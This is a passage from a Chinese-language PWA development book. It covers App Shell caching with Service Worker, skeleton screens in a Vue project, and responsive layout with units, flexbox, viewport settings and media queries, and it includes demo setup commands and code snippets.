Shell，以电商网站举例，不同品类的商品主题馆，颜色不同，甚至结构也会有一些区别，这就需要开发者灵活处理，可以分为多个 Shell，或者在一些页面去掉 Shell。 如何正确使用 App Shell 单独使用 App Shell 并不是一个很好的主意，对于速度要求比较高的站点来说，它会导致用户看到主要内容的时间延后，那么有没有办法呢？这个时候开发者会提到使用浏览器的 HTTP 缓存，这确实是一个不错的主意，但它也有\b一些很难解决的问题。 难以确定合适的 HTTP 缓存设置时间，也不适合更新比较频繁的站点 HTTP 缓存只有在 URL 相等的情况下才能起作用，这不符合 PWA 每个页面有唯一 URL 的要求 那么有没有更好的缓存方案呢？在第一章中，我们提到了 Service Worker 可以拦截网络请求和操作本地缓存，这给了我们足够的想象空间，可以结合 App Shell 和 Service Worker 来解决缓存问题。 使用 Service Worker 预缓存 App Shell 的静态资源 用户访问 Web 站点时，通过 Service Worker 拦截请求 Service Worker 返回缓存中的 App Shell 给浏览器 App Shell 根据当前的 URL 再去请求对应的数据来渲染 这样可以解决上面提到的所有问题。下面是 App Shell 和 Service Worker 结合使用的收益。 第二次访问速度极快且稳定。由于 App Shell 的内容已经缓存在本地缓存中，用户第二次访问会在极短的时间内渲染出 App Shell 为用户节省流量。用户在后续的访问都不会再请求 App Shell 的内容，而是只请求主体内容，不用加载一些公用的静态文件。 具有 Native App 的用户体验。无论是第一次访问还是后续页面的切换，都具有唯一不变的区域，没有传统 Web 页面切换的白屏。 App Shell 的案例 https://lavas.baidu.com 是百度 Web 生态团队开发的 Lavas 的官网。这是一个体验比较好的 PWA 站点，那么来分析一下这个站点是如何结合 Service Worker 和 App Shell 的。 下图右侧就是 Service Worker 缓存在 Cache Storage 中的 App Shell 内容，左侧顶上的 banner 就是 App Shell 的可见区域。整个页面的外壳部分被缓存起来，在下次访问时由 Service Worker 取出并直接返回，如果把网络断开再刷新页面，页面依然能够正常渲染。 经过我们前面的分析，App Shell 和 Service Worker 结合首屏展现速度会非常快，那么在这个案例中，首屏的性能到底如何呢，来看一下下面这张图，这张渲染性能的图是在 PC Chrome 上统计的。 从上图中，能看到大概在时间轴 200ms 的时候，已经渲染出了 App Shell。查看浏览器统计的详细 Event Log，上图中页面首次绘制是在 230ms，再减去上一个页面的销毁时间大概 80ms，实际上当前页面从开始发送请求到首屏渲染出来所花掉的时间是 150ms，对于用户来说，页面几乎是瞬间呈现，没有白屏时间。并且从上图中，也能看出渲染的顺序是先 App Shell，然后再渲染出主体内容，和我们预想的一样。 如果您觉得这个站点过于简单，无法体验 Service Worker 和 App Shell 结合的优势，下面列出了该团队提供的另一个较复杂的使用了 App Shell 模型的例子，也同样是体验非常良好的 PWA 站点。 https://lavas.baidu.com/12306/，这是百度 Web 生态团队开发的一个 demo，参考中国铁路在线售票系统 12306。 注意，这个站点只是 demo，不是 12306 官方的网站，不要输入密码等个人信息。 如何在 Vue 项目中使用 App Shell + Service Worker 第一章的例子也采用了 App Shell + Service Worker 的方式，但是没有采用任何框架辅助，在实际项目中，这样不借助任何框架编写 SPA 是比较少见的。在现代项目中，采用 Angular/React/Vue 来编写复杂 SPA 的项目占大多数，那么如何在这些框架中使用 App Shell 和 Service Worker 呢，下面我们用一个实际的例子来演示一下。 启动示例 和第一章的例子一样，您需要准备 Git，Node.js 和 npm 环境，准备完成后，可以通过下面的命令下载我们的示例，这个示例是根据 vue-cli 创建的很基本的 Webpack 模板，可以参考 npm 上的文档 vue-cli 简介。 # 从 GitHub 下载代码到本地 pwa-book-demo 目录 $ git clone https://github.com/lavas-project/pwa-book-demo.git # 进入到 chapter02/appshell 目录 $ cd chapter02/appshell # 安装 npm 依赖 $ npm install # 启动 chapter02 appshell 示例 $ npm run dev 在命令行中看到输出 Your application is running here: http://localhost:8080 后\b，代表服务已经启动成功，打开浏览器，访问 http://localhost:8080，能看到下图所示的页面。 这时，如果您打开 Chrome 调试工具，并定位到 Application 栏目，会发现没有注册 Service Worker，这是因为我们在开发模式下没有生成 service-worker.js 文件，根据我们的经验，在开发模式下启用 Service Worker 对开发调试会带来很大的影响，因为如果 Service Worker \b写的不够完善，会导致开发中\b修改后的文件得不到及时的更新，没有经验的开发者会花较多的时间来排查，因此我们的 demo 只有在编译之后才会生成 service-worker.js 文件。 # 编译 $ npm run build # 进入到编译后的 dist 目录 $ cd dist # 安装静态文件调试服务 $ npm install -g edp # 在 dist 目录中启动本地静态文件服务 $ edp ws start 在命令行输出了下面的文本后，即代表服务已经启动。 mockservice edp INFO EDP WebServer start, http://xxx.xxx.xxx.xxx:8848 打开浏览器，输入 http://localhost:8848，能看到调试模式下相同的页面。不同的地方在于，这个时候已经安装了 Service Worker，打开 Chrome 调试工具，定位到 Application -> Service Worker，如下图所示。 点击 Chrome 调试工具左侧的 Cache -> Cache Storage\b，能看到有两个 Cache Storage 实例，其中一个以 sw-precache- 开头的实例里面预缓存了 App Shell 所需的静态文件，如下图。 示例解析 哪些区域是 App Shell 在这个 Vue 的示例里，可见部分哪些是 App Shell 呢，我们可以查看 src/App.vue 文件。 熟悉 Vue 的开发者都知道 标签在 Vue 项目里是用来嵌入子路由的，Home.vue 和 NextPage.vue 是这个例子中的两个页面。 可以简单的认为，\b在 标签之外的内容都可以认为是 App Shell，不仅包括上面的 img 标签，下面的 bottom-navigation 组件，还包括在 标签外面的内容，如 index.html 文件中的其他部分。 如何缓存 App Shell 内容 在这个示例中，service-worker.js 文件是通过 SW Precache Webpack Plugin 插件生成的，可以参考 sw-precache-webpack-plugin 文档。代码如下所示： // build/webpack.prod.js #13 行 // 引入 sw-precache-webpack-plugin 插件 const SWPrecacheWebpackPlugin = require('sw-precache-webpack-plugin'); // build/webpack.prod.js #121 行 // 添加 sw-precache-webpack-plugin 插件生成 Service Worker 文件 new SWPrecacheWebpackPlugin(config.swPrecache.build) 它的配置写在 config/sw-preache.js 文件中\b，开发者可以对它做一定的修改。 编译之后，会在 dist 目录中生成 service-worker.js 文件，\b第四章中有对 Service Worker \b详细的介绍，在这里我们不必关心这个文件中过多的细节。插件生成的 Service Worker 做了很多事情，如下： 列出了项目中静态文件列表 \b预缓存了 App Shell 的静态文件 具有预缓存动态更新机制 Service Worker 的更新机制 // 预缓存文件列表，其中包含 App Shell 所有的文件 var precacheConfig = [[\"/index.html\",\"cb8786927330e5bdd417a47314a7300b\"],[\"/static/css/app.5be76b7d213b43df9723e8ab15122efb.css\",\"5b0aa7a24708300b7176f0304923ab39\"],[\"/static/images/icons/icon_144x144.png\",\"4bf0757895bd1cda44ee9204fe06a661\"],[\"/static/images/icons/icon_152x152.png\",\"c69908d502224c5317453f8ae725bbf0\"],[\"/static/images/icons/icon_192x192.png\",\"c69908d502224c5317453f8ae725bbf0\"],[\"/static/images/icons/icon_512x512.png\",\"8eaee831d59442821083453b174df0f6\"],[\"/static/js/0.2dd5b370dbfb9afda866.js\",\"5455b40e8991749d4aeb904f09389394\"],[\"/static/js/1.f740f9813d49b7661238.js\",\"65b7858bacef211f345d0d88fda81092\"],[\"/static/js/app.e9b2b9e109561a7201f5.js\",\"a28433e856b3e149bac022df934eb94e\"],[\"/static/js/manifest.69fbe521a6bc723a8ce1.js\",\"c6b6fbf7902cd5325b5b1d43045db622\"],[\"/static/js/vendor.7bb72363822163e0f3b3.js\",\"38d1baa4e38eeab57826462846900d69\"],[\"/static/manifest.json\",\"a521180656694782bc69a54ee5900dfb\"]]; var cacheName = 'sw-precache-v3-sw-cache-chapter02-appshell-' + (self.registration ? self.registration.scope : ''); 总结 总结来说，App Shell 把站点内容划分为“变”和“不变”两个部分，再辅以 Service Worker 技术将“不变”的部分缓存起来，以达成快速加载页面的效果。 通过 App Shell 和 Service Worker，我们有办法让“不变”的部分快速展现，那么针对“变”的部分，我们有什么办法让它展现得更快呢，或者让它“看起来”更快？在这里我们再提出另一种方案，它虽然不能在实质上提升页面的加载速度，但可以让它在感官上更快，它就是下一节要介绍的骨架屏。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-22 14:25:16 "},"chapter02/4-app-skeleton.html":{"url":"chapter02/4-app-skeleton.html","title":"2.4 骨架屏","keywords":"","body":"骨架屏 在前面的章节，我们说过，首屏速度对于用户留存率至关重要。 很多站点都会在完成基本功能后（或者同时）进行性能优化，常见的性能优化手段包括静态资源合并，压缩文件，使用 CDN，包括上一小节介绍的 App Shell 等，这些的确能够显著地缩短加载时间。但是我们想象一下，在首次打开时，主体内容渲染完成之前，页面基本上是空白的，这对于用户体验是非常不友好的。如果我们用能够快速渲染的静态图片/样式/色块进行占位，让用户对后续会渲染的内容有一定的预期，这要比白屏等待要好的多，这就是骨架屏。如上一节的结尾所述，它本质上并不提升页面的加载速度，却能提升感官体验，让网页“看起来”更快。 骨架屏长什么样 您可能没听说过骨架屏这个名字，但应该很早就在其他 App 上看到过，骨架屏常见的种类有列表、图片和两者的混合。 下面的图是饿了么 Web 站点 骨架屏的效果，这种效果是比较常见的类型，它使用各种形状的色块来模拟图片和文字，有些图标也会使用圆形色块。为了追求效果，还可以在色块表面添加动画效果，如波纹，看起来就像具有 loading 效果的骨架屏。 在图片居多的站点，使用低像素的图片进行占位也是一个不错的选择，图片配色及变化和原图相近即可，如果觉得生成低像素的图片成本较高，可以降级使用纯色色块代替，但色块的颜色最好和图片主体颜色相似，如果觉得这个成本还是很高，那么可以直接采用上面例子中统一颜色的色块。 骨架屏的精髓，并不是用什么来占位，而是无论什么内容占位，一定要保持渲染前和渲染后结构相似，不能差距太大，最好保持色块/图片间距一样，避免页面渲染后内容跳动。 骨架屏能用在哪里 现在的 Web 应用，从架构上来说分为前端渲染(CSR)和后端渲染(SSR)两种，骨架屏适用于前端渲染的页面，而后端渲染的页面渲染首屏时所有内容都已经存在了，因此无需骨架屏。但是，即使是后端渲染的页面有时也会存在前端渲染的区域，比如列表的加载，只要是用到 JavaScript 来渲染内容的地方，都可以选择性的使用骨架屏来占位。 由于近几年 Angular/React/Vue 的推出，前端渲染的站点越来越多，它们让开发复杂 Web App 变的很简单。它们的流行也大大提高了 App Shell 和骨架屏的普适性，大部分此类站点都可以采用这种模式。 在 Vue 项目中使用骨架屏 我们以 Vue 开发的单页应用为例，在其它框架上，实现思路是一致的。在这个示例中，为了方便调试，笔者将 Service Worker 的注册逻辑删除了。 开发者可以下载示例代码并启动，如下所示： # 从 GitHub 下载代码到本地 pwa-book-demo 目录 $ git clone https://github.com/lavas-project/pwa-book-demo.git # 进入到 chapter02/appskeleton-01 目录 $ cd chapter02/appskeleton-01 # 安装 npm 依赖 $ npm install # 启动 chapter02 appskeleton-01 示例 $ npm run dev 为了方便调试，我们将 src/main.js 中 Vue 实例的挂载时间推迟了 2s，在这期间，我们能看到骨架屏的效果。 // src/main.js const app = new Vue({ router, components: { App }, template: '' }) router.onReady(() => { // 将 mount 时间延后 2s，便于查看效果 setTimeout(() => app.$mount('#app'), 2000) }) 然后，我们需要在 index.html 中添加骨架屏，如下： body { margin: 0; } .skeleton { text-align: center; padding-top: 60px; } .skeleton-bottom { position: fixed; bottom: 0; left: 0; right: 0; height: 56px; box-shadow: 0 3px 14px 2px rgba(0, 0, 0, .12); display: flex; } ... 填写完成之后，刷新页面您能看到下图所示的骨架屏。 进阶优化：更快的展现骨架屏 在上面的例子中，为了让骨架屏尽早展现，我们需要做到以下两点： 把骨架屏的 HTML 内联在 index.html 中，而不是用 JavaScript 来渲染 骨架屏的 CSS 最好内联，保证骨架屏在最短的时间内渲染 可惜的是，尽管我们这么做了，也不一定能取得想要的结果，通过实际测试会发现骨架屏很难被用户看到，或者说它展示的时间不如预期的早。 现状分析 我们在上面的示例基础上来分析一下原因是什么。用 Chrome 调试工具中的 Performance 记录渲染流程，为了简单一些，我们可以将网络设置成 Slow 3G，会比较明显的发现骨架屏出现的时间非常短。 为了更接近生产环境，先将示例编译之后再调试。 # 在 chapter02/appskeleton-01 目录中 # 编译 $ npm run build # 进入到编译后的 dist 目录 $ cd dist # 安装静态文件调试服务 $ npm install -g edp # 在 dist 目录中启动本地静态文件服务 $ edp ws start 打开 Chrome 浏览器访问 http://localhost:8848。下图是笔者用调试工具记录的页面渲染流程，发现页面第一次渲染是在 app.*.css 加载完成之后。 按照预想，骨架屏应该在 HTML 加载完成之后立刻渲染出来，也就是在浏览器获取外链资源的同时，这也是为什么我们把骨架屏的 HTML 和样式都内联的原因，然而事与愿违，浏览器并不买账。 浏览器做了什么 熟悉浏览器的开发者很快就能理解，这与浏览器的渲染顺序有关。 相信大家都整理过行李箱。在整理行李箱时，会根据每个行李的大小合理安排，大的和小的配合，填满一层再整理上面一层。如果突然有人跑来和你说电脑不用带了，要多带两件衣服，这时除了想打他之外，你还需要重新安排行李。在浏览器中，这个过程叫做重排（reflow），而那个馊主意就是新加载的样式文件。显而易见，重排的开销是很大的，需要尽力避免。 既然每个 CSS 文件都可能会触发重排和重绘，那索性等待 中所有的外链样式文件加载完成之后再渲染，这个流程本身是没有问题的，却在骨架屏的应用中出了一些问题。 页面从加载到展现的大致顺序如下： 加载 HTML 文件 解析 DOM 并行加载 CSS/JS 资源 如果 中存在外链的样式，则阻塞渲染等待样式文件加载并解析完成 如果 中存在外链的 script，则阻塞渲染等待 script 文件加载并执行完成 在 Vue 的项目编译完成之后， 标签中的结构如下，在 标签中插入了一个外链的样式文件，导致骨架屏渲染推后。 PWA Chapter02 Demo - App Skeleton body { margin: 0; padding-top: 60px; } .skeleton { text-align: center; } .skeleton-bottom { position: fixed; bottom: 0; left: 0; right: 0; height: 56px; box-shadow: 0 3px 14px 2px rgba(0, 0, 0, .12); display: flex; } 为了尽早展现骨架屏，我们将骨架屏渲染所需的样式和 HTML 内联，却被页面中其他的外链样式文件阻塞了渲染。拿上一节中的 Vue 示例来举例，由于浏览器解析完 DOM 之后是并行加载外链资源的，所以在样式文件加载完成之后，JavaScript 文件也基本已经加载完成，因此在骨架屏真的渲染出来之后没多久就被 JavaScript 渲染的真正内容取代，这就是为什么骨架屏出现非常靠后，效果大打折扣。 所以，我们需要告诉浏览器，请放心大胆的先渲染骨架屏。 避免样式文件的加载阻塞骨架屏的渲染 Webpack 编译的 Vue 项目，会在 index.html 的 插入外链的样式文件，，这无疑会阻塞骨架屏的渲染。浏览器还提供了预加载机制，使用方法非常简单，只需将 rel=\"stylesheet\" 改为 rel=\"preload\"，浏览器会在空闲的时候加载并缓存，之后再使用就不用重复加载。 这看似无关的技术，在骨架屏的应用里将起到很大的作用，因为预加载的资源不会阻塞渲染. 我们通过这种方式告诉浏览器，先不要管 app.xxx.css，直接渲染后续内容，在 app.xxx.css 文件加载完成之后，再将它重新设置为样式文件，如下代码所示： 方法的核心是通过改变 rel 让浏览器重新认定这个 标签是样式文件，这样既不阻塞骨架屏的渲染，也能正常应用外链样式文件。 这样就完了吗？ 如果不将 标签 rel=\"stylesheet\" 改为 rel=\"preload\"，浏览器会根据资源的书写顺序来顺序执行，即先应用外链样式，再执行外链 JavaScript 文件渲染主体内容。但是根据上面的步骤，我们使用预加载来加载样式文件，这样做的结果就是我们无法保证浏览器会先应用样式再运行 JavaScript 渲染内容，一旦 JavaScript 先执行并渲染出了内容，再应用外链样式，会导致页面重排和重绘，用户会先看到排版完全是乱的页面，再看到正常的页面，对用户体验是不小的伤害。 因此，我们还需要考虑到文件加载顺序的问题，在样式文件加载完成前，即使 JavaScript 已经渲染好了内容，也先不要替换掉骨架屏，等待样式文件加载完成后，再触发 JavaScript 进行挂载。 在 Vue 的项目中需要修改 src/main.js 和 index.html 文件。 // src/main.js const app = new Vue({ router, components: { App }, template: '' }) /** * 挂载 Vue 渲染好的 HTML 元素到 #app 中，替换掉骨架屏 */ window.mount = function () { app.$mount('#app') } 这样就好了吗？ 还不够完善，如果样式文件在 JavaScript 文件之前加载，那么 mount 函数还没有声明，执行会出错，最终也导致主体内容没有渲染到页面上。还需要完善，增加一个标记告诉 JavaScript 样式是否加载完成，经过改造代码如下，同样还是 src/main.js 和 index.html 文件。 // src/main.js const app = new Vue({ router, components: { App }, template: '' }) /** * 挂载 Vue 渲染好的 HTML 元素到 #app 中，替换掉骨架屏 */ window.mount = function () { app.$mount('#app') } // 如果样式文件已经加载完成了，直接挂载 if (window.STYLE_READY) { window.mount() } 考虑到浏览器不支持 JavaScript 的情况，那么还需要增加一个 标签。 经过这番改造之后，我们再来看一下在 Chrome 中的表现，这个示例是在 Fast 3G 网络环境下展现的，如下图所示。骨架屏在 650ms 左右的时刻渲染完成，而样式文件是在 1200ms 左右才加载完成，没有阻塞骨架屏的渲染，符合期望。 如何在 Vue 项目中使用骨架屏 如果让开发者在 Vue + Webpack 项目中进行上面的改写，代价是比较高的，为此，百度 Web 生态团队写了一个 Webpack 插件，vue-skeleton-webpack-plugin。 总结 骨架屏从优化关键渲染路径思路出发，配合 App Shell 和 Service Worker 等技术，进一步优化页面在加载阶段的感知体验。通过本节学习示例，我们看到配合 Vue/Webpack 等一系列技术，为应用添加骨架屏可以变得更加简单。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-22 14:25:16 "},"chapter02/5-responsive-design.html":{"url":"chapter02/5-responsive-design.html","title":"2.5 响应式布局","keywords":"","body":"响应式布局 自从进入移动互联网时代，响应式布局这个词经常出现在 Web 设计和开发领域，它让 Web 页面在不同尺寸的设备上都具有良好的浏览体验。 开始之前 在讲解响应式布局之前，需要先了解一下基础知识，只有对它们都有一定的了解，才能在做响应式布局时选取合适的技术方案。 像素 像素这个单位很常见，指的是图像中最小的单位，一个不可再分割的点，在计算机屏幕上一般指屏幕上的一个光点。例如常见的描述中 iPhone X 的分辨率是 1125x2436，一般指的是在长和宽上像素点的个数。但是在 Web 开发中，我们知道 iPhone X 的像素是 375x812，那么这又是怎么回事呢？这里需要讲到设备像素（Device Pixels）和虚拟像素，也可以叫 CSS 像素（CSS Pixels）或者逻辑像素，后面我们统一使用 CSS 像素这个称呼，在 Android 开发中可以叫设备无关像素（Device Independent Pixel，简写 dip）。设备像素很好理解，对应屏幕上光点的数量。 在科技发展到今天，屏幕分辨率已经达到人眼无法区分单个像素的程度，人眼无法在 iPhone X 宽不到 7cm 的屏幕上数出 1125 个像素点。Web 开发人员眼中的 1px 可能对应多个设备像素，Peter-Paul Koch 在他的博文中有详细的讲解《A pixel is not a pixel is not a pixel》。 比如在 iPhone X 上，设备像素是 1125x2436，而 CSS 像素是 375x812，那么一个 CSS 像素对应的是长和宽各 3 个设备像素，9个设备像素点。 1 css pixel = 3 x 3 device pixels 那个这个比值 3 就是我们平时所说的设备像素比（Device Pixel Ratio），简称为 DPR。DPR 它并不是一个单位，而是一个比值，这个比值可以在浏览器中通过 JavaScript 代码获取。 // 设备像素比，在 iPhone X 中等于 3，在 iPhone 6 中等于 2 window.devicePixelRatio EM vs REM EM EM 是相对单位，相对于元素自身的 font-size，它不像像素是固定的单位，因此很适合用来做响应式布局。 h1 { font-size: 20px; margin: 1em; /* 1em = 20px */ } p { font-size: 14px; padding: 1em; /* 1em = 14px */ } .outer { font-size: 12px; } .inner { font-size: 2em; padding: 1em; /* 1em = 24px*/ } 如果当前元素没有设置 font-size，那么 1em 实际大小是多少？ p { padding: 1em; /* 1em 等于多少像素*/ } 在上面的代码中没有设置 的 font-size，它会从继承父元素的字体大小，如果父元素也没有设置字体大小，会一直找到根元素 ，而 元素的默认 font-size 一般是 16px。有的元素有默认的字体大小，比如 的 font-size 默认等于 2em，最终计算还是会追溯到最外层。 1em = 16px REM REM = Root EM，顾名思义就是相对于根元素的 EM，是根据根元素来计算出CSS 像素点的大小。根元素就是 ，而它的默认字体大小是 16px。 h1 { font-size: 20px; margin: 1rem; /* 1rem = 16px */ } p { font-size: 1rem; /* 1rem = 16px */ } 所以，如果我们改变根元素的字体大小，页面上所有使用 rem 的元素都会被重新计算元素属性并重绘。 EM vs REM EM 和 REM 都是相对单位，两者都可以用来做响应式布局的单位。根据它们的特性，EM 和 REM 互有优劣。 EM - 对于模块化的页面元素比较好，比如 Web Components 标签，标签内的元素都根据父元素计算像素大小，只需设置最外层父元素的字体大小可同时影响子元素，保持自定义元素具有一定的模块封闭性。但，EM 比较难以追溯，需要逐层向上排查显示设置了字体大小的元素。 REM - 方便是 REM 最大的好处，只需知道 的字体大小即可计算当前的实际像素大小。 有的开发者全部都用 REM，有些开发者全部用 EM，这其实都是不合理的用法。开发者应该视情况不同采用不同的单位，但在现在的环境下，REM 使用的更广泛一些。 开发者根据设计师提供的 UE 图进行开发时，测量出来的大小单位一般是像素，如果需要转换为 REM，可以采用 PostCSS 的插件 postcss-px2rem 自动转换为 rem 单位。 vw, vh，百分比 vw 和 vh vw 和 vh 现在还不常见，但也逐渐开始被开发者使用，特别是在布局上。 vw - viewport width，视口宽度，1vw = 1% 视口宽度 vh - viewport height，视口高度，1vh = 1% 视口高度 vw 和 vh 的逻辑比较简单，100vw = 100% 视口宽度，视口（viewport）会在后面详细讲解。下面的代码演示如何在 iPhone X 上计算 vw 的实际 CSS 像素大小，vh 的计算方法和 vw 一样。 p { width: 50vw; /* 1vw = 1 / 100 * 375px = 3.75px */ } 50vw = 50% viewport width = 50% * 375px = 187.5px 浏览器对 vw 和 vh 支持相对较晚，目前在 Android 4.4 以下的 Android Browser 上还不支持，但是国内主流应用的 WebView 内核都是自己定制的，内核版本都高于系统自带的，因此在国内 vw 和 vh 的支持度比 Can I Use 统计的要高很多，而且随着版本的推移，vw 和 vh 会更流行。 vw, vh vs 百分比 现在我们知道了，1vw = 1% 视口宽度，那么它们是不是等价呢？我们先来看一下下面的代码，同样还是以 iPhone X 为例。 .p1 { width: 50vw; /* 1vw = 1 / 100 * 375px = 3.75px */ } .outer { width: 80vw; } .p2 { width: 50%; } 50vw = 187.5px 50% = 150px 将上面的代码在浏览器中运行，发现第二个 标签的实际宽度为 150px，不是 187.5px。其实原理非常简单，就和 EM 和 REM 一样，百分比相对于父元素的宽度来计算，而 vm 根据视口的宽度来计算。 所以再回顾上面的例子中的第二个 标签，.outer 元素的宽度为 80vw = 300px，那么其子 标签的宽度为 300px * 50% = 150px。 除 vw 和 vh 外，还有 vmin 和 vmax 元素，这里就不继续展开，感兴趣的开发者可以访问 《Fun with Viewport Units》了解更多，这篇文章中对 vw 和 vh 讲的很详细，还有不少示例。 Web 开发中还有很多其他的单位，如 in（英尺），mm（毫米），cm（厘米）等，但因为使用的不多，开发者仅作了解就可以。 弹性框 上面我们讲到了百分比和 vw/vh，它们都可以用来实现响应式的布局，但是不如我们接下来要讲的弹性框灵活，它不是单位，而是一种布局方式。 区别于传统的布局方式，如标准文档流、浮动布局和定位布局，弹性框（flexbox）布局更加灵活，弹性框中的元素可以弹性伸缩，可以定义排版方向，还可以指定 flex 元素的顺序。下面是一个简单的例子。 .container { display: flex; /* 设置容器为弹性布局 */ } .box { width: 100px; height: 30vh; } .b1 { background: #009; } .b2 { background: #06c; } .b3 { background: #39f; } .b4 { background: #6cf; width: 50px; } 上面的例子在浏览器中的表现如下图所示，我们能看到，每个 元素都是横排，这是因为弹性布局默认排列为横向排列，我们可以通过 flex-direction 属性决定排列方向，同时在小于 350px 宽的浏览器里，会按比例自动缩小每个 的宽度。 从上面的例子中，\b能发现，有两个重要的角色需要开发者关注，一个是容器，一个是其子元素。 容器样式属性 容器指的是 display: flex 的元素，它可以定义其他的属性，决定子元素的排列，如下。 flex-direction - 定义主轴方向，即子元素的排列方向，取值为 row, row-reverse, column 和 column-reverse，默认为 row，即水平从左到右 flex-wrap - 默认情况下，弹性布局会将所有元素都压缩到一行，可以通过设置 flex-wrap 告诉浏览器在适当时候换行，取值为 nowrap, wrap 和 wrap-reverse，默认为 nowrap flex-flow - 这个属性值是 flex-direction 和 flex-wrap 的简写，如 flex-flow: row nowrap，等价于 flex-direction: row; flex-wrap: nowrap justify-content - 定义子元素在主轴上对齐方式，取值为 flex-start, flex-end, center, space-between, space-around，默认为 flex-start align-items - 定义子元素在垂直于主轴的交叉轴的排列方式，取值为 stretch, flex-start, flex-end, center, baseline，默认为 stretch，即如果没设置高度，将填满交叉轴方向 align-content - 定义了\b子元素在多条轴线上的对齐方式，如果只使用了一条轴线，那该属性不起作用，取值为 flex-start, flex-end, center, space-between, space-between, space-around 和 stretch，默认为 stretch 在弹性布局之前，开发者如果要实现子元素水平和垂直居中会比较麻烦，在弹性布局中，非常容易实现，只需要在容器上设置轴线对齐方式，如下代码所示。 .container { display: flex; /* 设置容器为弹性布局 */ justify-content: center; /* 设置在主轴上居中对齐 */ align-items: center; /* 设置在交叉轴上居中对齐 */ } 子元素样式属性 同样，子元素也有\b很多新增的样式属性，如下： order - 设置子元素在主轴方向上的顺序，取值为数字，从小到大排列，默认为 0 flex-grow - 定义子元素的放大比例，取值为数字，默认为 0 flex-shrink - 定义子元素的缩小比例，取值为数字，默认为 1 flex-basis - 定义在分配\b\b多余空间之前，子元素的默认大小，默认为 auto flex - 是 flex-grow, flex-shrink 和 flex-basis 的简写，默认值为 0 1 auto align-self - 覆盖父元素的 align-items 属性，可以让子元素自身采用不同的对齐方式，默认为 auto，继承父元素的 align-items 弹性布局非常灵活，属性值也足够应对大部分复杂的场景。可以阅读这篇文章查看详细的介绍《A Complete Guide to Flexbox》。 那么，开始之前需要了解的内容就到这了，接下来看如何实现响应式布局。 设置 viewport 支持响应式第一步，需要做的是设置页面的 viewport。移动端网页会在头部书写 viewport 的元标签，它告诉浏览器页面多大尺寸，是否需要缩放。 想要理解 viewport 可以阅读 Peter-Paul Koch 写的三篇文章，《A tale of two viewports — part one》，《A tale of two viewports — part two》，《Meta viewport》。 在早期，移动设备经常需要打开 PC 端的网页，早期的移动设备设备像素比较低，多为 320px，而 PC 端的网页宽度一般都很大，所以，如果将 PC 端的网页在移动设备上打开，会因为页面太窄而导致布局错乱。为了解决这个问题，浏览器会将页面默认 viewport 设置为一个较大的值（Safari 默认是 980px），所以 PC 端的网页在移动设备浏览器上都能正常打开，只是元素看上去比较小。 在上面的例子中，viewport 的值 width=device-width，告诉浏览器用 屏幕宽度（单位为 CSS 像素）来作为页面宽度渲染，在 iPhone X 下是 375px，不同的设备宽度可能不一样。这个视口被 Peter-Paul Koch 称为理想视口（ideal viewport），也是体验最好的视口大小。 viewport 元标签的取值有 6 种，如下表所示 字段名 取值 说明 width 正整数，device-width 定义视口的宽度，单位是 CSS 像素，如果等于 device-width，则为理想视口宽度 height 正整数，device-height 定义视口的高度，单位是 CSS 像素，如果等于 device-height，则为理想视口高度 initial-scale 0 - 10 初始缩放比例，允许小数点 minimum-scale 0 - 10 最小缩放比例，必须小于等于 maximum-scale maximum-scale 0 - 10 最大缩放比例，必须大于等于 minimum-scale user-scalable yes/no 是否允许用户缩放页面，默认是 yes 确保内容不会超出 viewport 设置了 viewport 为理想视口，如果在 iPhone X 上，有元素的宽度超出了 375px，那么就会溢出到视口外面，导致出现横向滚动条。无论是在 PC 端，还是移动端，用户的都习惯上下滚动，而不是左右滚动，强迫用户横向滚动或者缩小页面来浏览全部的内容，体验很不好。 因此，不能期望设置 viewport 宽度能解决适配问题，还需要开发者记住以下原则。 不要使用大的固定宽度的元素，如果不考虑穿戴式设备，不要设置大于 320px 的宽度 不应该让内容在某一个特定宽度的 viewport 下才能正常显示 使用相对单位或者媒体查询让元素在不同大小的视口下适配 对于图片或者视频等嵌入式的元素，可以在站点 CSS 中添加下面的代码。 img, embed, object, video { max-width: 100%; /* 设置 img 等元素最大宽度威 100% */ } 使用媒体查询 媒体查询（media query）让开发者可以有选择性的应用不同 CSS，媒体查询提供了简单的判断方法，可以根据不同的设备特征应用不同样式，比如设备的宽度、类型、方向等，可以参考 MDN 上的文档《CSS 媒体查询》。 /* 如果设备类型为屏幕并且 viewport 小于 800px 宽，设置 body 背景颜色为灰色 */ @media screen and (max-width: 800px) { body { background: #ccc; } } 如果需要使用媒体查询应用的样式比较多，可以独立为一个文件，通过在 标签中设置媒体查询条件。 媒体查询支持很多设备特征，常用的主要是 viewport 的宽高和设备方向，如下表所示。 设备特征 取值 说明 min-width 数值，如 600px 视口宽度大于 min-width 时应用样式 max-width 数值，如 800px 视口宽度小于 max-width 时应用样式 orientation portrait|landscape 当前设备方向，portrait 垂直，landscape 水平 如何选择 min-width 和 max-width 的取值，我们称为选择断点，主要取决于产品设计本身，没有万能媒体查询的代码。但经过实践，我们也总结了一套比较具有代表性的设备断点，代码如下。 /* 很小的设备（手机等，小于 600px） */ @media only screen and (max-width: 600px) { } /* 比较小的设备（竖屏的平板，屏幕较大的手机等, 大于 600px） */ @media only screen and (min-width: 600px) { } /* 中型大小设备（横屏的平板, 大于 768px） */ @media only screen and (min-width: 768px) { } /* 大型设备（电脑, 大于 992px） */ @media only screen and (min-width: 992px) { } /* 超大型设备（大尺寸电脑屏幕, 大于 1200px） */ @media only screen and (min-width: 1200px) { } 如果要对细分屏幕大小进行适配，可以查看文章，列出了详细的常见设备的媒体查询条件，《media queries for common device breakpoints》。 最佳实践 响应式文字 大多数用户阅读都是从左到右，如果一行文字太长，用户阅读下一行时容易出错，或者用户只会读一行文字的前半部分，而略读后半部分。在上世纪就有研究表明，一行 45 ～ 90 个英文字符是最好的，当然这要看是什么字体，一个中文汉字一般对应两个英文字符，所以，对于中国用户来说，一行文字合理的数量应该是 22 ～ 45 个字符。 字体大小对阅读体验同样重要，基本字体一般不小于 16px，行高大于 1.2em。 p { font-size: 16px; line-height: 1.2em; /* 1.2em = 19.2px */ } 而设备的尺寸多种多样，如果设计师希望在平板上将字体设置为 18px，开发者可以使用前面讲到的 REM 和媒体查询，代码如下。 /* 在屏幕宽度大于 600px 的设备上使用下面的样式 */ @media only screen and (min-width: 600px) { p { font-size: 1.125rem; /* 